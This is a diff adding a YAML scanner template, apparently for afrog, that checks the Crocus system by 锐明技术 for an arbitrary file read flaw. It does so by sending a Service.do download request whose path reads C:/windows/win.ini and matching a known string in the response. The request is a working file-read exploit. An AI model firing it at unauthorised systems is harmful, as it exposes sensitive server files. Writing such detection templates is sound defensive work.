@@ -1,0 +1,19 @@
+id: crocus-service-do-fileread
+
+info:
+  name: 锐明技术Crocus系统存在任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Crocus系统存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感信息。
+  tags: crocus,fileread
+  created: 2025/02/14
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /Service.do?Action=Download&Path=C:/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: r0()
